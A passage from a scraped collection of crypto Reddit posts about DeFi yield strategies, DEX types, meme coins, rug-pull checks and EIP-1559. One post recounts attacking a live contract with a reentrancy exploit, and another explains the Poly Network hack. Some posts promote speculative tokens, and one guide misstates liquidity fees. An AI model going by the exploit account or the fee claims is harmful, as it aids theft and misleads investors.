my loan are: $2,400 * 3.46% = $83.04 $95.37 - $70.56 + $125.47 + $83.04 = $233.32 i deposited $990 dai on aave, so my expected annual rate of return is roughly: 233.32 / 990 = $23.56% what are the principal risks of this strategy? the apy of my deposit and my loan deviate significantly. for example if my deposit apy goes down to 1% and my loan apy goes up to 5%, the strategy stops making economic sense. the upside is that this strategy can be closed as quickly as it was opened (20 minutes). the matic rewards disappear. this would make this strategy uneconomical. dai coin loses its peg. this strategy mainly works because there is very little to no fluctuation between dai and usdc. as long as the peg stays, there is stability in the strategy. your metamask wallet gets hacked. please make sure you set up your wallet carefully. although it looks complicated, once you get a hang of metamask, polygon, quickswap, and aave, getting this strategy in place is not that complicated. once its up and running, you are welcome to either keep accumulating matic rewards (and add the price volatility of matic to your strategy), or periodically exchange matic to dai. as long as the apys stay close and the matic rewards continue, this strategy works and i believe it is great on a risk adjusted basis. i expect matic rewards to be reduced slowly over time, so it is probable that my 23.56% expected annual return will be lower. however it sure beats the 0.30% expected annual return i am currently getting in my savings account. *for informational purposes only. this is not investment advice.* **edit: thanks to everyone who shared the alternative ways to earn apy using defi! i would be looking into some of these** remember that i did this exercise as an illustration. this was to teach myself and others how is it that you could reach such high expected rates of return on stable coins.",73,101,0.96,2021-06-03 13:59:35,web3,defi,Annapurna__,False,93.8

/r/CryptoTech PSA: there are broadly TWO TYPES of Decentralized Exchanges. Which type are you investing in?,"""decentralized exchange"" technology comes in two types: 1. currency-neutral 2. currency-centric **currency-centric** decentralized exchanges are built on top of an existing coin platform, such as ethereum, counterparty.io and the endless drove of johnny-come-lately new platforms. these currency-centric exchanges a) are not a new idea by any stretch of the imagination, and more important than this b) require you to operate within the confines of a specific coin's ecosystem. for example, a currency-centric decentralized exchange built on ethereum will only be able to autonomously escrow ethereum-based assets (i.e. erc20s) for blockchain-based trading. likewise, a currency-centric decentralized exchange like counterparty.io will only be able to autonomously escrow counterparty-based assets for blockchain-based trading. when people say a certain exchange is a ""decentralized exchange"", you need to reflect back on the fact such exchanges are *insular* to the coin upon which they're built. in addition, imo you should reflect on the fact this style of decentralized exchange has proliferated since early 2014, and so the approach is just plain not new or novel in any respect. conversely, **currency-neutral** decentralized exchange technology hasn't been perfected, and is truly the cutting edge of decentralized trading. unlike currency-centric decentralized exchange tech, which is isolationist and insular to a given coin's ecosystem, currency-neutral decentralized exchange tech is designed to interconnect native cryptocurrencies with one another. importantly, with currency-neutral decentralized exchanges, there are no limitations on which coin you can trade, and you needn't buy into any given cryptocurrency ecosystem to use the decentralized exchange. for example, bisq.io is a currency-neutral decentralized exchange. install the client on your desktop computer and you'll immediately notice how it's designed to enable trading any given cryptocurrency for any other. there's no blockchain underlying bisq, except insofar as the tradeable cryptocurrencies listed on bisq obviously each have their own blockchain. probably the single most important caveat of currency-neutral decentralized exchanges is there's no good way to do leveraged trading or options/futures contracts; for this you probably do need a currency-centric decentralized exchange (many of which are icos). otherwise, for people who see the phrase ""decentralized exchange"" and think: ""decentralized poloniex"", what you really want is a currency-neutral option like bisq.io. note a confounding factor to currency-centric decentralized exchanges is the propensity of currency-centric developers to ico their project. this frequently leads to meritless hype and endless shilling of currency-centric decentralized exchanges, which comes at the cost of liquidity on true currency-neutral decentralized exchanges like bisq. as a community of traders who are interested in lowering the importance of centralized exchanges like poloniex, we are doing ourselves a disservice by hyping currency-centric decentralized exchanges which don't accomplish the goal, siphon liquidity from exchanges like bisq, and distract newcomers. imo the future of decentralized exchanges will without a doubt feature cross-chain atomic swap technology for trustlessly and instantly trading one cryptocurrency for another without a middleman. your currency-centric decentralized exchange is going to be shellacked by this, because there's no reason you need to interject an entire new coin into this equation, wherein the currency-centric decentralized exchange's underlying coin effectively becomes a middleman in that its investors are needlessly rent-seeking.",103,55,0.97,2018-01-19 10:32:41,web3,CryptoTechnology,insette,False,93.5

Which decentralised exchange has the most promise for 2018?,i have had tried to use barterdex by komodo and found the set up difficult. probably too difficult for a layperson to even bother. this is despite them being the market leader in atomic swaps (i believe). you have to send your funds from your cold wallet to their agama wallet before you trade which is inconvenient. has anyone done a breakdown and comparison of the other dex platforms? also the fee for use of barterdex is 1/777 or 0.128%. i thought that was cheap until i realised that binance charges only 0.1% if you use bnb. so there is actually a financial disincentive to leave a centralised platform. any thoughts? :),84,84,0.93,2018-01-18 19:13:17,web3,CryptoTechnology,youngm2,False,93.3

The best arguments for or against Proof of Stake,"often times critiques against proof of stake boil down to some form of ""you are letting the richest holders control the network,"" and while that makes sense to me, i wonder if those who argue in favor of proof of stake acknowledge or reject that assertion, and how they justify that. i tend to think ""bitcoin maxxis"" or more broadly pow > pos arguments get many things right but i do notice they sometimes don't feel the need to take their arguments too deeply, so i would like to offer the opportunity to do that. there are surely many interesting arguments on both sides that are rarely explored, like: * don't the wealthiest miners also have the ability to control bitcoin in a similar fashion? how significant is the fact that hash power is external to the network while stake is internal? * slashing solves the fundamental attack of pos, the ""nothing at stake attack."" what are the downsides to slashing and why isn't pos with slashing the standard if it readily makes pos secure? * do staking pools which offer liquid capital in exchange for the staked native token/coin threaten to centralize the network? * similarly, do defi protocols which offer more return on the base asset than staking does threaten to funnel coins away from staking, where they bolster security, to lending protocols, where they do not? i'm not looking to affirm any preconceptions, but if you feel passionately about any of this i'd like to hear why and i'm willing to read or watch anything offering to go in depth into this discussion. i understand ethereum is the de-facto leader on the subject (even if they aren't quite there yet) and that their proposals aren't always simple; i personally have decent experience researching blockchain technology and cryptography and am willing to go down any rabbit holes offered, so don't be shy to get technical. thanks in advance.",62,114,0.94,2022-05-26 13:44:09,web3,CryptoTechnology,Matt-ayo,False,92.19999999999999

New innovations in DeFi. What are you looking towards?,"hey everyone, as we’ve all noticed crypto is getting hit pretty hard right now leading to a ton of discussion about how it's useless, unviable, defi is dead, etc. imo the people bagholding from the initial mania are expressing their anger onto every social channel there is. i think it's a great time to look into projects that are still building and purchasing them on discounts (if they're crashing). personally i’m interested in projects that do something innovative for crypto. i’m not a fan of a new protocol that provides more apy% than the other, but instead projects that have a different value proposition. i initially made a few hundred bucks from p2e like axies, decentraland, etc, before they inevitably exploded in popularity. i’m a fan of p2e as i think it has it’s place in crypto, however, during this bear market i’m looking towards projects that are kicking it up a notch. the idea that comes to mind is looking at projects that are building something innovative that hasn’t been done before, things like chingari's, [create-to-earn](https://bitcoinist.com/with-gari-mining-chingari-delivers-on-its-promise-to-democratize-the-creator-economy/), shakepay's, [shake-to-earn](https://www.gofullcrypto.com/blog/get-bitcoin-in-canada-with-shakingsats), helium’s [mining mechanism](https://decrypt.co/102610/helium-crypto-wireless-network-to-launch-new-tokens-amid-expansion), and even stepn’s [walk-to-earn](https://techcrunch.com/2022/05/22/play-move-to-earn-solana-stepn-gamefi/). i don’t know how viable they’ll all be long term but i believe it’s a step in the right direction to innovate beyond what people thought was possible. even during market downtrends i feel that if you have faith in crypto as a whole it’s not a bad idea to invest in some projects you think would do well. let me know what defi projects you think will overperform in the next few years.",70,95,0.98,2022-06-15 19:50:28,web3,defi,Popular_Rub9075,False,89.8

How to buy meme coins in 2024 - AN UPDATED GUIDE,"let's be real - the solana memecoin scene isn't what it used to be. pump.fun fees have dropped 90% from their peak, which pretty much tells you everything you need to know about the current state of things. but don't write off memecoins just yet. there are still plays to be made if you know where to look. i've been in this game for a while now, and i've seen the ups and downs. had a few nice wins, sure, but i've also been rugged more times than i care to admit. here's what i've picked up along the way: trading basics: 1. get yourself a solana wallet. i use phantom, but there are other options. 2. find the coin you want and grab its address. 3. use jupiter or a telegram bot to swap sol for your memecoin of choice. 4. when it's time to sell, do the same thing in reverse. if you're new to this and all that sounds complicated, there are simpler options out there. i've been trying out [moonshot.money](http://moonshot.money) lately. it's not perfect, but it does make buying memecoins a bit more straightforward if you're not ready to dive into the deep end of dexes and wallets. investment strategies: 1. the yolo approach: jumping on brand new coins. it's basically gambling, but hey, sometimes it pays off. 2. the slightly more sensible play: looking for coins that have been around for a bit and have some kind of community. 3. the inside track: getting to know influencers and devs. it's work, but it can pay off. what to look for: * is the meme actually funny, or at least catchy? * does it have a real community, or is it just bots? * is it riding a current trend? * how does its market cap compare to similar coins? * some coins react to real-world news, especially political stuff. some tips: * clean up your twitter. follow people who actually know what they're talking about. * don't bet the farm. seriously. * be careful with coins that are tanking. * use stop-losses. they're there for a reason. * keep an eye on the broader market. when bitcoin sneezes, memecoins catch pneumonia. * stick to platforms you trust. * never, ever share your seed phrase. * take profits. don't get greedy. despite the downturn, pump.fun still managed to rake in over $100 million in fees since launch. that tells you there's still money moving around in this space. the solana breakpoint conference is coming up in singapore. these events can sometimes shake things up, so keep an eye out. look, 100x gains are rare. if you're consistently hitting 10x, you're doing better than most. do your homework, don't believe the hype, and remember - this is still basically gambling. be careful out there.",75,91,0.83,2024-08-31 13:39:56,web3,solana,EntireInflation8663,False,89.7

Shorting USDT,"i use aave to borrow usdt against my collateral and buy more eth and btc with my borrow usdt. in a way im shorting usdt here, since the collapse of usdt would make the loan i have to pay back minimal. of all the top stables that can collapse, i'd say tether is the most likely. if usdt doesnt collapse, well then its ok cuz its just a normal loan then. this is why i went with this game plan of mine. &#x200b; i am now realizing tho that the variable apy of borrowing aave can increase rapidly. it's at 19% as i type this. that being said it make me wonder if this game plan of mine really isnt shorting usdt at all. lets say usdt price falls to 0.9 usd. people will pull out their deposited usdt on aave, the apy of usdt borrowing will increase drastically since supply has gone down, and maybe it will hit 50%, or 100%, or 300%, or 1000%. i have no idea. i'm writing to ask the experienced experts on here. is the game plan of borrowing usdt on aave to short it useless since the variable apy will just screw you as usdt price falls (if that ever happens). thank you! &#x200b; note: if it is, i'd rather just borrow in dai or usdc to avoid the high borrow apy",80,78,0.95,2021-07-09 16:35:21,web3,defi,ThoseDamnDinklebergs,False,88.7

Understanding DeFi Metrics (Guide),"with everything progressing rapidly in the defi space here's a quick guide to get beginners up to speed with the new terms they are going to encounter! &#x200b; **new metrics** when using defi platforms it is important to understand new terms that you can help you properly navigate the space. these metrics will help you to understand and evaluate how good a defi platform is so you can work out which platform is best for you. ultimately, the more of these new terms you understand, the better equipped you'll be to make informed decisions. &#x200b; **total value locked (tvl)** the total value locked measures the total amount of funds that are locked into a defi platform. on a platform that does borrowing and lending, the tvl would represent the amount of funds that users have deposited onto the platform, which other users can then borrow. tvl is also being used as a metric to measure growth. if the tvl of a platform increases it generally means more money is flowing into the platform, which shows it is growing. like market caps, the tvl can also be used to represent the total value locked for the entire defi space. on defipulse.com you can view the tvl for the total defi space as well as individual platforms. https://preview.redd.it/icky2fzl3bu61.jpg?width=1180&format=pjpg&auto=webp&s=fd9c59ccda52bebd6017ce71d1a208ae62156280 it is important to note that tvl values can fluctuate because of price fluctuations in cryptocurrencies. if a borrowing and lending platform uses eth as collateral, then the tvl is dependent on the price of eth. if it goes up the tvl in us dollars will increase, and vice versa. so consider tvl a close estimation and not an exact measure of the value locked into the platform. &#x200b; **market cap to tvl ratio** the market cap to tvl ratio measures the ratio of the market cap to the amount of funds locked on the platform. since the tvl can be a guide for how well the platform is doing it can be compared to the market cap to judge whether it is valued correctly. to calculate the market cap to tvl ratio simply divide the market cap by the tvl. although, a website like coinmarketcap.com will already have those metrics displayed so you won't need to do any calculations. https://preview.redd.it/h8f5epao3bu61.jpg?width=1171&format=pjpg&auto=webp&s=a027e47310ae39469176788f468312cf5db5517e above, you will see the metrics for a project called aave. here, their market cap to tvl ratio is 0.7994. anything with a value of 1 or more means that their market cap is higher than the tvl. any value less than 1 means their tvl is higher than their market cap. since aave has a ratio of less than 1, their tvl is higher than their market cap. &#x200b; **trading pair** a trading pair, or pair, is a group of two coins that can be traded for each other. to exchange one coin for another, there has to be a pair available for the trading to happen. if you wanted some usdc, a stablecoin, you would need to have a coin that you can trade it for. the usdc-eth trading pair is the most popular pair for usdc. so, if you wanted to get usdc you can trade it for some eth. uniswap is the most popular decentralized exchange for trading tokens that run on the ethereum blockchain. on info.uniswap.org you can find a list of the top trading pairs and other metrics such as liquidity and volume. https://preview.redd.it/cbdkcevr3bu61.jpg?width=1480&format=pjpg&auto=webp&s=c2499fac5ddfad44c6fd51eaa657d1ee3d8e78bf **liquidity** when using decentralized exchanges to trade and swap coins, it is important to understand what liquidity is and how it can affect your trade. when you want to trade eth for usdc what happens is you give eth to the platform, and it will give you usdc, like swapping one for the other. the platform has the tokens because its users provide them, which are put in a pool for you to swap with. the liquidity is the amount of coins available in that pool to use, which is expressed in dollars. above, you can see that the liquidity for the eth-usdc pair is $295 million. this means there is $295 million worth of eth and usdc which is available to use for swapping between the two. the larger the liquidity is, the more coins are available to swap with. if someone wanted, they could swap $50 million worth of usdc for eth because there is enough for them to use. however, the cost of your liquidity provider fee is based on how much you take from the pool. if someone were to take $50 million from a pool that has $295 million they would have to pay a 17% fee because that's how much they took out of the pool. since most people aren't trading with that much money something like that won't be a problem unless the trading pair has really low liquidity. below is the usdc-lym pair which has a liquidity of $455,000. this means that if you wanted to swap $100,000 of lym for usdc then you would pay a 22% fee because you are using 22% of the liquidity. &#x200b; https://preview.redd.it/cnyh5o1u3bu61.jpg?width=697&format=pjpg&auto=webp&s=96ccf60b1e3c231eeb36ac025ee3dca2f11187b1 essentially, higher liquidity makes it easier to swap larger amounts and gives you a lower liquidity provider fee will be. when trading pairs have low liquidity, it may be harder to swap large amounts, and can give you a higher liquidity fee. ultimately, it depends on how much you intend to swap. it is always best to remain cautious with small coins that have low liquidity. &#x200b; **inflation rate** the inflation rate is the amount of new coins that are being created. currently, bitcoin's inflation rate is 1.76% because the supply of bitcoin is only increasing 1.76% per year. while a project may have a small supply of coins, it is important to see how many new coins are being created. while a large inflation rate isn't necessarily a bad thing, it can negatively affect the price if demand for the coin is less than the amount they are creating. eth is a token that has no supply cap, however, can increase in price because demand for it is higher than the amount that is being created, among other things. &#x200b;

Tricked by a honeypot contract or beaten by another hacker. What happened?,"so here i am, thinking that i'd have some fun hacking a contract, but it seems the contract pulled a trick me instead, very clever! or perhaps i got beaten to the punch by another hacker? so this is what happened: while randomly browsing some contracts on etherscan, i stumbled on this contract: https://etherscan.io/address/0x95d34980095380851902ccd9a1fb4c813c2cb639#code i immediately spotted that it would be vulnerable to a rentrancy attack (see: https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4) ""beauty!"", i thought. ""i can have some fun and try out this hack, and give the funds back to the contract creator later. there's 1 eth in there, so it should be a fun challenge, maybe do a victorious blog post later"". the first thing i did is to is to re-deploy his contract on ropsten testnet. then i wrote my exploit code, and tried it out. after a few tries, it worked! i was able to empty the test contract using my exploit contract. so next day, i decided it was time to run it on the real thing. min deposit was 1 ether. here's my attack transaction: https://etherscan.io/tx/0xed5eaf959224dff10fb705e16af81017374f3f3856ada926571aa9f8ef8e0b63#internal it didn't work! the eth got stuck in his contract. i was shocked, how's it possible? what's funny is that etherscan.io is showing internal transactions, the eth was transferred to his contract, then two transfers showing as going to my exploit contract, however it didn't get anything, what is going on? well, out of desperation and defeat, i called it again (kind of like the good old ""did you try turning it on and off again"" logic there), https://etherscan.io/tx/0x56c436b949fb5483124e44c30b2e43b6cefed7d1d093d8244bbe66ae0fde1842 - also didn't work. shucks. by that time, i went back to the drawing board to see if i have a bug with my exploit contract, however it worked fine on testnet, so not sure what the problem was. about 20 minutes later, i noticed that my victim got drained! it was done by this transaction: https://etherscan.io/tx/0x9d19c476aba9eaae6628d8619b122d85a294ff47d9486a765e64a6488db599a0#internal i'm quite baffled by that transaction - did another hacker beat me to the punch? what did he do different to me? here is my exploit contract: https://ethfiddle.com/uerfi4pw59 updates ====== update 1: it looks like a new incarnation of the honeypot just appeared here https://etherscan.io/address/0xd116d1349c1382b0b302086a4e4219ae4f8634ff#code update 2: regarding etherscan missing some sends (eg. especially missing the txn of the mallicious ""dad1"" contact, etherchain.org has much better details. it looks like ""dad1"" was very busy since it was deployed - i wasn't the only one to fall for this! eg, https://www.etherchain.org/tx/a532fc4c05b906490f93351fd6cf1cd46340f794de4cda603e914eb1ccaf7d1c and there's a few more, ouch! update 3: looks like someone else fell for the honeypot again. also, see this excellent detailed explanation from u/smarx of what's happening: https://www.reddit.com/r/ethdev/comments/7xu4vr/oh_dear_somebody_just_got_tricked_on_the_same/dubakau/",89,62,0.99,2018-02-12 20:20:27,web3,ethdev,CurrencyTycoon,False,88.10000000000001

"Ethereum's EIP-1559 Goes Live Next Month, Here's a Quick Run Down","next month, ethereum’s london hard fork will go live and with it comes ethereum improvement proposal (eip) 1559. one of the most significant but also controversial alterations to the ethereum blockchain since the split between ethereum and ethereum classic, eip-1559 brings with it several changes to the way fees are set and distributed on the network. &nbsp; traditionally, users include a “gas” fee in their transaction to incentivize miners to include it in the block and fees are “set” by a highest bidder model. if you set your fee too low, other users might outbid your gas fee and your transaction may linger in the pool until it expires and is cancelled. this can lead to unpredictable and volatile fees during high usage times. the new model will set fees according to network usage with a variable “base fee” which will be burned, or destroyed, and only an optional tip will go to the miners. the base fee is automatically set by the ethereum protocol based on usage and demand, aiming for 50% network utilization and drifting up or down to meet that goal. &nbsp; considering over $1 billion was earned in transaction fees by miners in may, miners and mining pools are obviously upset about this change and have vocally opposed it over the past couple months, organizing protests and even threatening to stall the network in a show of force against the upgrade. these actions have only led to ethereum developers pushing up their desired timeline for a move to eth 2.0, which would formally transition the ethereum blockchain from proof-of-work to proof-of-stake, cutting out the miners role in securing the blockchain by basing security on staked assets, rather than hash power. &nbsp; since the base fee will be burned when the transaction is included in a block, therein lies the potential for the eth token to be deflationary. if the amount of eth burned, based on gas fees, is higher than the amount of eth given as a block reward, the total amount of eth generate per block would end up being in the negatives. during previous network highs, this threshold would have been passed and people believe this would create upward pressure on the price of eth as the supply is slightly diminished. &nbsp; when it comes down to it, eip-1559 is a much desired upgrade to the blockchain and could aid adoption as institutions and individuals can better predict how much they’ll need to spend to complete a transaction and how long it will take for that transaction to be confirmed. clarifying how much and how long is extremely important for wider adoption and acceptance among the greater financial community. &nbsp; what does everyone thing the biggest impact of eip-1559 will be on the ethereum network? do you think there will be major implication for defi?",114,23,0.98,2021-06-11 22:25:02,web3,defi,charmcitycuddles,False,87.39999999999999

"Developers, how do you deal with developers who aren't involved in blockchain?","i recently noticed a post on /r/programmerhumor equating web3 with mlm. seeing the nonsense in the thread i replied to one comment trying to bring a little clarity, saying nothing more than ""web3 is blockchain integration with web technology"", no mention of cryptocurrency, no pro/anti bias whatsoever, a simple sentence. big mistake. this spiralled into some of the most inane stuff i've ever read from apparent programmers. and i've spent the last couple of days challenging most of the drivel. i've realised this is a problem across almost all tech forums. it's like there is a blind, emotional reaction to anything blockchain. people completely overlook that it is nothing more than a technology, not good or bad. have others experienced this? do you think this conversation will settle down as time goes on? do you try to stay away from typical developer communities when discussing blockchain? here is the post if you're interested: [https://www.reddit.com/r/programmerhumor/comments/wxpzux/web3\_is\_a\_mlm\_for\_nerds\_change\_my\_mind/](https://www.reddit.com/r/programmerhumor/comments/wxpzux/web3_is_a_mlm_for_nerds_change_my_mind/)",64,92,0.94,2022-08-26 11:02:33,web3,ethdev,StackWeaver,False,84.6
"Ok here's how the Poly Network hack actually worked. If I'm reading the contracts correctly, it's pretty genius.","poly has this contract called the ""ethcrosschainmanager"". it's basically a privileged contract that has the right to trigger messages from another chain. it's a pretty standard thing for cross-chain projects. there's this function verifyheaderandexecutetx that anyone can call to execute a cross-chain transaction. basically it (1) verifies that the block header is correct by checking signatures (seems the other chain was a poa sidechain or something) and then (2) checks that the transaction was included within that block with a merkle proof. here's the code, it's pretty simple [https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross\_chain\_manager/logic/ethcrosschainmanager.sol#l127](https://github.com/polynetwork/eth-contracts/blob/d16252b2b857eecf8e558bd3e1f3bb14cff30e9b/contracts/core/cross_chain_manager/logic/ethcrosschainmanager.sol#l127) the basic mechanism used here is: deposit your assets into a ""lock box"" on one blockchain. some representation of those assets magically appear on the other blockchain. the ""lock box"" will only ever release assets if it gets a message from a corresponding ""lock box"" on another blockchain basically asking it to ""please give this user some funds"". the ""lock box"" authenticates this message from the other blockchain by checking that it's been signed by a group of people that poly called ""bookkeepers"". the hacker figured out how to override the list of bookkeepers so that the hacker was now the /only/ bookkeeper. this made it possible for the attacker to forge messages from the ""lock box"" on the other chain. the ""lock box"" on ethereum suddenly got a message that said ""please give the hacker all of the money"". it checked the signature attached to that message and it matched the bookkeeper! but of course it matched the bookkeeper, the bookkeeper was the hacker now! src: [https://twitter.com/kelvinfichter/status/1425217046636371969](https://twitter.com/kelvinfichter/status/1425217046636371969)",105,30,0.95,2021-08-11 03:26:23,web3,ethdev,publius-varus,False,84.5

A new concept in Staking - Flashstake for immediate upfront yield,"**what is it?** in recent times crypto staking has exploded, since it's an easy way to earn passive income. you see many projects competing with each other to offer the best apy rates but there isn't any new innovation in this area. i want to introduce you guys to the new concept of flashstaking. flashstaking allows people for the first time to stake tokens for a period of time and then receive the interest upfront and immediately within the same transaction. you essentially get rewarded for staking and putting trust in the network. the more / longer you stake the higher the reward you get. **how does it work?** the dapp relies on liquidity pools that work the same way as uniswap. e.g. when a user stakes their flash tokens for dai tokens, their tokens get locked up in a smart contract and a portion of new flash tokens are minted. these new flash tokens are used to buy dai tokens from the liquidity pool and then sent to the user immediately. at the end of the staking period, the user gets their staked flash tokens back. if they want to get their flash tokens back early then a portion of their locked flash will be burned, relative to the remaining time of the staking period. you can try out the staking dapp here [https://app.flashstake.io/stake](https://app.flashstake.io/stake) flashstake website [https://flashstake.io/](https://flashstake.io/) creators of flashstake [https://blockzerolabs.io/](https://blockzerolabs.io/) etherscan [https://etherscan.io/token/0x20398ad62bb2d930646d45a6d4292baa0b860c1f](https://etherscan.io/token/0x20398ad62bb2d930646d45a6d4292baa0b860c1f) coingecko [https://www.coingecko.com/en/coins/flashstake](https://www.coingecko.com/en/coins/flashstake) they are also working on intergrating l2 and new usecases based on the protocol , such as staking payments (stake your tokens and pay someone with the yield) and also allowing the flashstaking of any erc20 token for yield. what do you guys think ? edit: *i removed the flash in 5 article because it has the old contract address.*",85,59,0.98,2021-03-29 11:54:39,web3,defi,CaptainKlN,False,84.39999999999999

Will Blockchain Account Systems Remain the Same or Evolve With Technology?,"read about this [medium article](https://medium.portto.com/aptos-review-series-2-account-system-e8e8af712115) talking about the various different forms of account systems in crypto. such as the utxo model, account-based model, private keys, etc. thought it'd be great for a thread discussing the current systems and what would be used long term(simplifying points from the article for the thread). bitcoins ledger system is based on asymmetric cryptography. generate a private key and corresponding public key (address) and that itself is your ""identity"". a very straightforward and barebones model but it does the job on a broad level. account based models are more intuitive and flexible, like the ""upgrade"" of the utxo model. we're talking about keeping data such as nfts, dapps, friends' address, etc., think metamask, phantom wallet, and more. as for the authentication mechanism, it's still taken from private keys. what happens if you have a social identity attached to that address but you lose it? well in theory your digital identity is ""gone"". is there a solution to this? that's where rotatable keys can potentially be used. in addition to having a digital key, you could also incorporate 2fa, multi-party auth from daos, and even recovery mechanisms in the worst case. for example, dapper wallet on ethereum and aptos provide something to support the digital identity as well as having verification beyond just the identity. do you guys think crypto will inevitably stick to it's roots of the original ledger system or will rotating keys/multi-sig auth become more prominent as time progresses. personally i believe that the og ledger system does the job, but for those that may not be as hardcore in crypto, it may be beneficial to provide alternatives to them, especially if they lose access.",92,43,0.93,2022-10-03 19:44:38,web3,CryptoTechnology,Organic_Bluejay_8400,False,81.69999999999999
"ARE WE JUST IN THE "".COM BUBBLE"" TIME OF NFT'S?/ DISCUSSION","**intro** hey, i'm fairly new to reddit but am relatively involved in the crypto/defi/nft space. i was thinking the other day and decided i wanted to create a discussion, and gauge the general consumer sentiment towards the truth about how practical nft's are, and if they really are going to revolutionize the world orrrrrrrrrrr are they just being hyped because they're something new and humans are bored.. i guess the best way i see to go about this, is by listing **my personal** point of view in the form of pros and cons. then from there see the argument/ other points brought up by various other community members, that i most certainly will miss. &#x200b; **pros** 1. **art** as an art enthusiast, im thrilled that independent artists now have the spotlight to create a career off of this new found platform that they've been given. the traditional art world has been flipped on it's head and nft's have levelled the playing field for smaller artists that don't have the initial support from the socialite society. i see it as essentially the autists stand to the art elite just like with the gme/ robinhood fiasco. 2. **securitization** i also understand that it is in one way, the next progression in what i like to call securitization; meaning that nft's are how the art world will be able to eliminate the potential for counterfeits, fakes, or replicas being produced, by attaching a cryptographic code to the piece of art. thus creating a nft a piece of art with a cryptographically generated code that cant really be replicated therefore making it forever a 1 of 1. also a creative way this has been utilized is with contracts; selling shares of a company through the auction of a nft... ect 3. **fund raising** i've also observed that nft drops are essentially being used as fundraisers for later plans that a company has, like tv shows/ video game development/ card games.... ect. this is a new take on start up capital raising, annnnndddd has allowed for a small community to come together to kickstart something that can turn into a multimillion dollar movement. 4. **gaming industry** other than the attention it's bringing to the industry. i'm kind of on the fence about this one and i'll explain why later. &#x200b; &#x200b; **cons (** these are my personal views of what i don't quite understand) 1. **hype** wether we like to admit it or not paying millions of dollars for a pixelated head is a little absurd. unless it's really just a ploy for money laundering which most art is... ahaha. that being said, like most things that are hyped, they often fade as quickly as they blow up... and lets face it, a majority of us have been locked inside due to the pandemic so humans are bound to fixate their ever-shrinking attention span on something. add the potential to ""make thousands of $$$"" and you have a great recipe for something that is gonna go viral for a while. 2. **securitization** (the bad) the opposite argument to the point stated earlier in this post is that i personally don't see securitization as something thats revolutionary... it's the same principal as before, just wearing different different outfit now. back during the renaissance when art was really progressing and artists like michelangelo were making a name for themselves, his ""securitization"" was simply the fact that no one else had the talent to create art pieces they way he did.. his art couldn't get replicated because it was too difficult to acquire the skills to do what he did, the same way that its too difficult to guess or crack the cryptographic code attached to a nft (for now). as for contracts, it's still the same thing, instead of buying the rights to something or shares of a company and signing a contract you just buy the nft... almost like a bearer bond... which brings me back to the money laundering statement.. &#x200b; **neutral** i decided to create a neutral column simply because i don't see these points fitting into the pro or con category or think theres very valid argument to both perspectives. &#x200b; 1. **gaming industry** i continue to hear one of the main utilities of nft's being about the revolutionary changes nft's will make to the gaming industry. but if im going to be honest it's not very revolutionary... most video games already have a in game currency that you can purchase with fiat currency.. the only difference being auctions and the huge new found consumer base for it. everything else isn't really related to nft's... the metaverse was always something that gaming companies have been working towards and it seems to me that they just like to tie it in with nft's because of the hype the current topic has around it. &#x200b; **conclusion** overall i like nft's and currently participate in the space but i wanted to voice my opinions and encourage a discussion to see if there are maybe some perspectives i haven't considered. &#x200b; **so what do you think? nft's are they overhyped like most money making trends are.. or are they justified and this is only the beginning.. let me know :)**",96,37,0.93,2021-10-06 18:57:41,web3,defi,Few-Gas-878,False,81.69999999999999
Roaring Kitty: GameStop Causes a Shift In Memecoin Meta. ,"roaring kitty, also known as keith gill, was very well-known in the crypto and investment space around 2021. on may 12th, he made a post on x, featuring a gamer getting up from his seat, ready to 'lock in.' this post amassed a total of 25 million views, as everyone was on their toes, wondering what roaring kitty would do next. he then proceeded to post many more times with old memes from back in 2021, when gme (gamestop) was very popular. one of his tweets featured thanos saying 'i'll do it myself,' almost bluntly indicating to buy gamestop, as it was about to surge even higher, which is exactly what happened. stocks and coins on solana, and the main stock itself, saw a significant surge, so much so that gamestop stock was halted due to volatility. due to this extreme jump, many solana influencers jumped on the hype train as soon as possible. gamestop was backed up by basically every single popular influencer you can think of in the x space, further driving its rise. the surge in gamestop's price caused an old meta to return, known as the stocks meta, and stock coins such as amc skyrocketed along with gme. this volatile shift from the cats, dogs, and cars meta to stocks caused many coins that were previously performing well to tank. only coins with very strong communities, such as powsche, michi, and wif, were able to hold pretty well, but even those lost many holders. it's been around 2 and a half days now since the return of roaring kitty, and i wonder how the market will continue to be affected, specifically the memecoin market, as extreme amounts of volume and liquidity were put into the gamestop token. i believe that those memecoins that were able to hold during these droughts, such as the one i mentioned, powsche, will go back up, and those that didn't will likely fade away. thank you for reading this long post; i felt like writing something today. feel free to comment down below on what you think about the market right now, what marketcap you think gamestop will reach and if the stocks meta will truly remain a thing for some time.",74,73,0.8,2024-05-14 19:37:47,web3,solana,Ok_Cranberry_9653,False,81.6

[PSA] How to greatly reduce your chances of being rugged.,"# intro i've been helping people in discord servers for a while now, the amount of people i've seen get rugged since november is crazy so wanted to post here in the chances of helping anyone here. # hard rug 101 first off you have to determine your personal risk level. getting in earlier generally means you have a higher chance to profit, however if you're just looking for a 1.5x, 2x or a longer term 10x (over hours or days) you have to rug check the coin. there's a few ways to do this first i generally use [https://rugcheck.xyz/](https://rugcheck.xyz/), this is run by fluxbeam and you do not have to connect your wallet. you paste in the ca and it checks a few things for you. these are the main things you want to look at in order of importance # liquidity locked (100% to start), as time goes on you'll see established coins having less than 100% locked for example 98% liquidity locked, this is from users adding their own liquidity and is perfectly normal. if you don't want to get rugged never buy into a new coin where the liquidity isn't locked. a very small percentage of coins will start out with unlocked liquidity and the dev locks or ""burns"" it after launch, which causes the coin to pump in those scenarios however it's very rare, 999 times out of 1000 if the liquidity isn't locked the token is a rug. # freeze authority off this means they can freeze your token account not allowing you to sell. if they have freeze authority on it's a good idea not to purchase. i've only encountered 1 coin that had locked liquidity and freeze authority on however the owners were freezing accounts causing the value to stay at a certain level, then the unfroze accounts can sell theirs using you as liquidity. there is never a good reason for freeze authority to be on with a coin that's purchasable. # distribution in wallets if there's a high distribution in one wallet (and it's not raydium), the creator holds a lot of the token and can (usually will) sell/dump on you. a side point about distribution if you see a pretty even distribution across 10-20 wallets that generally means the creator just spread it to those wallets on creation and can do the same as above (dump on you). # mutability this is the last thing, this isn't really a big deal just means they can change the token image, etc, if all of the above are good to go this isn't one to really worry about. # notes on checking for wallet distribution and freeze authority birdeye is a nice alternative to check most of the above, however it doesn't show liquidity that's why i usually throw it at rugcheck real quick. these are at a minimum the things you should know and be checking, and 